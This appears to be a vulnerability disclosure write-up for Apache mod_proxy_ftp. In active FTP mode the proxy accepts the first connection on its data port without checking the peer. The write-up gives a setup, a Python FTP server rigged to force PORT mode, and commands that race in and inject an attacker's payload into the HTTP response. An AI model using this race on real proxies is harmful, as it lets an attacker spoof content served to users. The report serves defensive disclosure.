# 012 â€” `mod_proxy_ftp` accepts any peer on active-mode data port

In active FTP mode, the proxy `apr_socket_accept()`s the first connection on
its local listening socket and feeds those bytes to the HTTP client without
checking that the peer matches the FTP control-connection peer. A racing
attacker that connects first wins.

## Setup

```apache
LoadModule proxy_module      modules/mod_proxy.so
LoadModule proxy_ftp_module  modules/mod_proxy_ftp.so

ProxyRequests On
<Proxy "*">
    Require ip 127.0.0.1
</Proxy>
```

A cooperating FTP server on `127.0.0.1:2121` that refuses EPSV/PASV so the
proxy falls back to `PORT`. It also tells the attacker the advertised
`PORT` endpoint (out of band, e.g. via stdout):

```python
# port_only_ftp.py
import socket, threading, sys
def handle(c):
    c.sendall(b"220 ok\r\n")
    while True:
        line = c.recv(512)
        if not line: return
        cmd = line[:4].upper()
        if   cmd.startswith(b"USER"): c.sendall(b"331 ok\r\n")
        elif cmd.startswith(b"PASS"): c.sendall(b"230 ok\r\n")
        elif cmd.startswith(b"SYST"): c.sendall(b"215 UNIX Type: L8\r\n")
        elif cmd.startswith(b"PWD"):  c.sendall(b'257 "/"\r\n')
        elif cmd.startswith(b"TYPE"): c.sendall(b"200 ok\r\n")
        elif cmd.startswith(b"EPSV"): c.sendall(b"500 no\r\n")
        elif cmd.startswith(b"PASV"): c.sendall(b"500 no\r\n")
        elif cmd.startswith(b"PORT"):
            print("PROXY ANNOUNCED:", line.decode().strip(), flush=True)
            c.sendall(b"200 PORT ok\r\n")
        elif cmd.startswith(b"RETR") or cmd.startswith(b"LIST"):
            c.sendall(b"150 ok\r\n")
            import time; time.sleep(2)        # let attacker race in first
            c.sendall(b"226 done\r\n")
        else:
            c.sendall(b"500 ?\r\n")

s = socket.socket(); s.bind(("127.0.0.1", 2121)); s.listen(4)
while True:
    cs, _ = s.accept()
    threading.Thread(target=handle, args=(cs,), daemon=True).start()
```

```bash
python3 port_only_ftp.py
```

## Trigger

Send the FTP request through the proxy:

```bash
curl -x http://127.0.0.1:80 ftp://127.0.0.1:2121/file.txt &
```

Read the announced `PORT a,b,c,d,p1,p2` line from `port_only_ftp.py`'s
stdout, decode `host = a.b.c.d`, `port = p1*256 + p2`, then race in
before the FTP server connects:

```bash
PORT_LINE='PORT 127,0,0,1,178,42'   # example
HOST=$(echo "$PORT_LINE" | awk -F'[ ,]' '{print $2"."$3"."$4"."$5}')
PORT=$(echo "$PORT_LINE" | awk -F'[ ,]' '{print $6*256+$7}')

python3 -c "
import socket, sys
s = socket.create_connection(('$HOST', $PORT))
s.sendall(b'HIJACKED-RESPONSE-FROM-ATTACKER\n')
s.shutdown(socket.SHUT_WR)
" 
```

## Observed effect

curl receives the attacker's payload as the HTTP response body:

```text
HTTP/1.1 200 OK
Content-Type: application/octet-stream
...

HIJACKED-RESPONSE-FROM-ATTACKER
```

`error_log` shows no warning â€” the proxy never compared the accepted
peer's address against the control peer. tcpdump on `lo` confirms two
distinct `127.0.0.1` flows reached the listener and the attacker's TCP
SYN arrived first.
